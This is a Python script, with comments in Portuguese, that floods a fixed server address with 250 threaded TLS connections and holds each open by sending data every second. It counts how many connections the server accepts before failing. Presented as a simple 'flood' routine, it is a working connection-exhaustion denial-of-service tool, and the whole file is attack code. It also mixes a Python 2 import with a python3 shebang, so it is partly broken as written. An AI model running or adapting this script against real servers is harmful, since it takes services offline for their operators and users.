#!/usr/bin/env python3
#coding: utf-8 
import socket
import threading
import ssl
import resource
import time
import sys
from Queue import Queue
from multiprocessing import Process, RawValue, Lock

resource.setrlimit(resource.RLIMIT_NOFILE, (65536, 65536))

class Counter(object):
    def __init__(self, value=0):
        self.val = RawValue('i', value)
        self.lock = Lock()

    def increment(self):
        with self.lock:
            self.val.value += 1

    def decrement(self):
        with self.lock:
            self.val.value -= 1

    def value(self):
        with self.lock:
            return self.val.value

co = Counter()

class conn(threading.Thread):
    def __init__(self, nconn):
        threading.Thread.__init__(self)
        self.nconn = nconn
        self.socket = False
        
    def connect(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s = ssl.wrap_socket(s, ssl_version=ssl.PROTOCOL_TLSv1)
        try:
            s.connect(('10.0.23.14', 443))
            self.socket = s
            print(self.nconn)
            co.increment()
            return True
        except:
            print('nao conectei')
            return False
            

    def run(self):
        if self.connect():
            while True:
                if self.socket:
                    try:
                        self.socket.send('nothing'.encode())
                        time.sleep(1)
                    except:
                        co.decrement()
                        return
                else:
                    return

threads = []

def flood(number_of_connections):
    for i in range(0, number_of_connections):
        threadx = conn(i)
        threadx.daemon=True
        threads.append(threadx)
        threadx.start()

start_val = 250

flood(start_val)

while True:
    time.sleep(1)
    print("Total the server supported: " + str(co.value()))
    print("Total the server didnt supported: " + str(start_val - co.value()))
    #print('partiu mata todo mundo')
    #for t in threads:
    #    t.stop()
    #t = []

#for t in threads:
#    t.join()
